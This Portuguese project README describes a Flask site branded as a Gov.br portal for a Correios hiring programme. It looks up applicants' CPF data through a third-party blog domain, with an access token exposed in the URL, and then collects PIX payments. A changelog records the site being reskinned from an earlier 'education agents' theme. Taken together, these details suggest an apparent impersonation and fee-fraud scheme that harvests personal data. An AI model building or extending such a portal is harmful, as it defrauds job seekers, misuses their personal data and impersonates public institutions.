# Correios Contrata - Portal Gov.br

## Visão Geral
Portal governamental brasileiro para o programa "Correios Contrata", implementando um sistema completo de inscrição e seleção pública para funcionários dos Correios.

## Stack Tecnológico
- **Backend**: Flask (Python)
- **Frontend**: HTML5, CSS3, Tailwind CSS
- **Banco de dados**: PostgreSQL
- **APIs**: 
  - FOR4 PAYMENTS (PIX)
  - API de CPF (consulta.fontesderenda.blog)
  - ViaCEP

## Características Principais
- Sistema de inscrição multiétapas
- Validação de CPF via API externa
- Pagamento via PIX
- Agendamento de exames psicotécnicos
- Sistema direcionado aos Correios
- Interface responsiva

## Alterações Recentes
**30/07/2025 - Eliminação Completa de Referências Educacionais**
- Substituída imagem principal pela nova imagem da agência dos Correios
- Removidas TODAS referências a "agente da educação", "PNAE", "educação" e termos relacionados
- Atualizados todos templates HTML com terminologia dos Correios
- Modificados metadados, títulos e descrições para refletir tema dos Correios
- Alterados cargos disponíveis: carteiro, atendente comercial, auxiliar de triagem, etc.
- Atualizado banco de dados com posições específicas dos Correios
- Corrigidas referências em app.py, populate_database.py e for4_payments.py
- Alterado sistema SGTE para SGTC (Sistema de Gestão do Trabalho dos Correios)

**29/07/2025 - Transformação para Tema Correios**
- Alterado foco do projeto de "Agentes da Educação" para "Correios Contrata"
- Atualizados títulos, textos e terminologias em todas as páginas
- Modificados cargos disponíveis para funções dos Correios
- Alteradas referências institucionais para ECT (Empresa Brasileira de Correios e Telégrafos)
- Mantida estrutura técnica e funcionalidades do sistema

**12/07/2025 - Integração API de CPF**
- Implementada integração com API externa para validação de CPF
- Rota `/validar-cpf` configurada no backend
- JavaScript atualizado para consumir API real
- Dados do CPF exibidos na seção "Verificação de Identidade"
- API utilizada: `https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}`

## Estrutura de Arquivos
```
├── app.py                    # Aplicação Flask principal
├── templates/
│   ├── formulario_inscricao.html  # Formulário com integração API
│   ├── confirmacao_agendamento.html
│   └── ...
├── static/
│   ├── css/
│   └── js/
├── for4_payments.py         # Integração PIX
└── models.py               # Modelos de dados
```

## Fluxo de Inscrição
1. Identificação Pessoal (CPF + API)
2. Verificação de Identidade
3. Pagamento PIX
4. Registro SGTE
5. Agendamento Psicotécnico
6. Confirmação Final

## Configuração de Ambiente
- DATABASE_URL: Conexão PostgreSQL
- FOR4_PAYMENTS_SECRET_KEY: Chave API PIX
- TOKEN_CPF_API: Token para validação de CPF

## Estado Atual
- Servidor Flask rodando na porta 5000
- Integração API CPF funcionando
- Frontend responsivo implementado
- Sistema de pagamento PIX configurado

## Próximos Passos
- Testes de integração com API real
- Validação de dados retornados
- Tratamento de erros de conectividade
- Implementação de fallbacks